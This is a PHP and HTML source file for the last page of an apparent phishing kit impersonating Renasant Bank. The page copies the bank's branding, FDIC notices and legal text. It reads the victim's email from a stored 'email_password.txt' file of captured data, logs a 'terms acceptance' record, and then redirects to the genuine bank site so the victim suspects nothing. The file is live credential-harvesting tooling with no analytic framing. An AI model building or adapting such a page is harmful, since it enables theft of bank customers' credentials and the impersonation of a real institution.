<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $isChecked = isset($_POST['agree']);
    
    // Validation
    if (!$isChecked) {
        $errors['agree'] = 'Please agree to the terms before continuing.';
    }
    
    if (empty($errors)) {
        // Get user email from previous step for completion message
        $userData = getUserData('email_password.txt', $username);
        $userEmail = 'N/A';
        if (!empty($userData)) {
            $userEmail = $userData[0]['usr_eml'] ?? 'N/A';
        }
        
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'terms_acceptance',
            'usrnm' => $username,
            'terms_accepted' => $isChecked,
            'usr_eml' => $userEmail,
            'completed_at' => date('Y-m-d H:i:s')
        ];
        
        saveUserData('terms_acceptance.txt', $data);
        
        // Redirect to final URL (need to determine Renasant's equivalent)
        header('Location: https://www.renasantbank.com/');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terms of agreement - Renasant Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96] flex flex-col">
    <!-- Header -->
    <header class="bg-[#114b66]">
        <div class="max-w-6xl mx-auto">
            <div class="h-20 flex items-center justify-center px-6">
                <img
                    src="assets/Logo-Dark-Background.png"
                    alt="Renasant Bank"
                    class="h-10 w-auto"
                />
            </div>
        </div>
        <div class="bg-white/90">
            <div class="max-w-6xl mx-auto px-6 py-2 text-xs text-slate-600">
                <div class="flex items-center gap-3 italic">
                    <img
                        src="assets/FDIC_Logo_blue.svg"
                        alt="FDIC"
                        class="h-6 w-auto"
                    />
                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-center justify-center px-4 py-12">
        <div class="space-y-6 w-full max-w-md">
            <div class="bg-white rounded-md p-8 shadow-lg shadow-slate-900/10 space-y-6">
                <div class="text-center space-y-2">
                    <h2 class="text-2xl font-semibold text-slate-700">Terms of agreement</h2>
                </div>
                
                <?php if (!empty($errors)): ?>
                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                </svg>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-red-700">
                                    <?php echo htmlspecialchars($errors['agree']); ?>
                                </p>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>
                
                <form method="POST" class="space-y-4">
                    <p class="text-sm text-slate-600">
                        By submitting this registration form, you authorize Renasant Bank and its affiliates to request and receive information
                        about you from third parties, including copies of your consumer credit report and motor vehicle records, at any time while
                        your account remains active.
                    </p>
                    <p class="text-sm text-slate-600">
                        You also authorize us to retain a copy of this information for use in accordance with our 
                        <a href="#" class="text-[#0f4f6c] hover:underline">Terms of Service</a> and 
                        <a href="#" class="text-[#0f4f6c] hover:underline">Privacy Statement</a>.
                    </p>

                    <label class="flex items-center gap-2 text-sm text-slate-700">
                        <input
                            type="checkbox"
                            name="agree"
                            <?php echo (isset($_POST['agree'])) ? 'checked' : ''; ?>
                            class="h-4 w-4 text-[#0f4f6c] focus:ring-[#0f4f6c] border-slate-300 rounded"
                        >
                        I understand and agree
                    </label>

                    <!-- Submit Button -->
                    <button
                        type="submit"
                        class="w-full bg-[#0f4f6c] text-white py-3 rounded-md font-medium transition hover:bg-[#0a3d52]"
                    >
                        Finish
                    </button>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#114b66] text-white">
        <div class="max-w-6xl mx-auto px-6 py-6">
            <div class="flex flex-col gap-4">
                <div class="flex items-center gap-4 text-sm">
                    <div class="flex items-center gap-3">
                        <img src="assets/ehl.svg" alt="Equal Housing Lender" class="h-10 w-auto" />
                        <img src="assets/fdic.svg" alt="Member FDIC" class="h-10 w-auto" />
                    </div>
                    <span class="uppercase tracking-wide text-xs">© RENASANT BANK</span>
                </div>

                <div class="flex flex-wrap gap-3 text-sm">
                    <a class="underline" href="#">Accessibility</a>
                    <span>|</span>
                    <a class="underline" href="#">Mobile Privacy</a>
                    <span>|</span>
                    <a class="underline" href="#">Privacy Statement</a>
                    <span>|</span>
                    <a class="underline" href="#">Digital Banking Agreement</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Auto-focus checkbox on page load
        document.addEventListener('DOMContentLoaded', function() {
            const checkbox = document.querySelector('input[type="checkbox"]');
            if (checkbox && !checkbox.checked) {
                checkbox.focus();
            }
        });
        
        // Clear error when checkbox is ticked
        document.querySelector('input[type="checkbox"]').addEventListener('change', function() {
            const errorDiv = document.querySelector('.bg-red-50');
            if (errorDiv) {
                errorDiv.style.display = 'none';
            }
        });
    </script>
</body>
</html>
